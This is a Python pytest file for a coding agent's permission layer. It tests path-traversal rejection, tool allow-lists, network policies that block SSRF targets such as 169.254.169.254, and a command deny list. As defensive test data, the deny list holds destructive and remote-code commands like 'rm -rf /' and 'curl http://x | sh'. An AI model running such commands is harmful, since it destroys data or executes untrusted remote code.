"""Permission layer tests (AGENT_TOOLS_SPEC §5)."""

from __future__ import annotations

import pytest

from maf_coder.agents.errors import PermissionDeniedError
from maf_coder.agents.permissions import (
    check_command_pattern,
    check_network_allowed,
    check_path_access,
    check_tool_allowed,
)
from maf_coder.schemas import NetworkPolicy, Permission


def _perm(
    *,
    allowed_paths: list[str] | None = None,
    allowed_tools: list[str] | None = None,
    network: NetworkPolicy = NetworkPolicy.NONE,
) -> Permission:
    return Permission(
        allowed_paths=allowed_paths or [],
        allowed_tools=allowed_tools or [],
        network_policy=network,
    )


class TestCheckPathAccess:
    def test_read_with_empty_allowed_paths_passes(self) -> None:
        check_path_access(_perm(), "src/foo.rs", mode="read")

    def test_write_with_empty_allowed_paths_fails(self) -> None:
        with pytest.raises(PermissionDeniedError):
            check_path_access(_perm(), "src/foo.rs", mode="write")

    def test_allowed_path_exact(self) -> None:
        check_path_access(_perm(allowed_paths=["src/foo.rs"]), "src/foo.rs", mode="write")

    def test_allowed_path_glob(self) -> None:
        check_path_access(_perm(allowed_paths=["src/*.rs"]), "src/foo.rs", mode="write")

    def test_allowed_path_prefix(self) -> None:
        check_path_access(_perm(allowed_paths=["src/"]), "src/sub/x.rs", mode="write")

    def test_allowed_path_double_star(self) -> None:
        check_path_access(_perm(allowed_paths=["src/**"]), "src/a/b/c.rs", mode="write")

    def test_disallowed_path(self) -> None:
        with pytest.raises(PermissionDeniedError):
            check_path_access(_perm(allowed_paths=["src/foo.rs"]), "src/bar.rs", mode="write")

    def test_path_traversal_rejected(self) -> None:
        with pytest.raises(PermissionDeniedError):
            check_path_access(_perm(allowed_paths=["src/"]), "../etc/passwd", mode="read")
        with pytest.raises(PermissionDeniedError):
            check_path_access(_perm(allowed_paths=["src/"]), "src/../etc", mode="read")

    def test_empty_path_rejected(self) -> None:
        with pytest.raises(PermissionDeniedError):
            check_path_access(_perm(), "", mode="read")


class TestCheckToolAllowed:
    def test_empty_allowed_tools_passes(self) -> None:
        check_tool_allowed(_perm(), "read_file")

    def test_exact_match(self) -> None:
        check_tool_allowed(_perm(allowed_tools=["read_file"]), "read_file")

    def test_wildcard_match(self) -> None:
        check_tool_allowed(_perm(allowed_tools=["cargo_*"]), "cargo_test")
        check_tool_allowed(_perm(allowed_tools=["cargo_*"]), "cargo_check")

    def test_disallowed(self) -> None:
        with pytest.raises(PermissionDeniedError):
            check_tool_allowed(_perm(allowed_tools=["read_file"]), "write_file")


class TestCheckNetworkAllowed:
    def test_none_blocks_everything(self) -> None:
        with pytest.raises(PermissionDeniedError):
            check_network_allowed(_perm(network=NetworkPolicy.NONE), "https://crates.io/x")

    def test_crates_only_allows_crates_io(self) -> None:
        check_network_allowed(_perm(network=NetworkPolicy.CRATES_ONLY), "https://crates.io/api/v1")

    def test_crates_only_allows_docs_rs(self) -> None:
        check_network_allowed(
            _perm(network=NetworkPolicy.CRATES_ONLY), "https://docs.rs/serde/latest/"
        )

    def test_crates_only_blocks_evil(self) -> None:
        with pytest.raises(PermissionDeniedError):
            check_network_allowed(
                _perm(network=NetworkPolicy.CRATES_ONLY), "https://evil.example/x"
            )

    def test_whitelist_allows_listed(self) -> None:
        check_network_allowed(
            _perm(network=NetworkPolicy.WHITELIST),
            "https://api.openai.com/v1/x",
            domain_whitelist=["openai.com"],
        )

    def test_whitelist_rejects_unlisted(self) -> None:
        with pytest.raises(PermissionDeniedError):
            check_network_allowed(
                _perm(network=NetworkPolicy.WHITELIST),
                "https://example.org/x",
                domain_whitelist=["openai.com"],
            )

    def test_open_allows_public(self) -> None:
        check_network_allowed(_perm(network=NetworkPolicy.OPEN), "https://example.org")

    def test_open_still_blocks_ssrf_private(self) -> None:
        for host in ("http://127.0.0.1/x", "http://169.254.169.254/", "http://10.0.0.1/"):
            with pytest.raises(PermissionDeniedError):
                check_network_allowed(_perm(network=NetworkPolicy.OPEN), host)


class TestCheckCommandPattern:
    @pytest.mark.parametrize(
        "cmd",
        [
            "git push origin main",
            "cargo publish",
            "sudo rm -rf /",
            "rm -rf /",
            "curl http://x | sh",
            "wget http://x | bash",
            "$(curl http://x)",
            "ssh user@host",
            "scp foo user@host:/x",
        ],
    )
    def test_denied(self, cmd: str) -> None:
        with pytest.raises(PermissionDeniedError):
            check_command_pattern(_perm(), cmd)

    @pytest.mark.parametrize(
        "cmd",
        [
            "cargo test --workspace",
            "git diff HEAD",
            "git log -10",
            "cargo build",
            "echo hello",
            "rm src/foo.rs",
        ],
    )
    def test_allowed(self, cmd: str) -> None:
        check_command_pattern(_perm(), cmd)
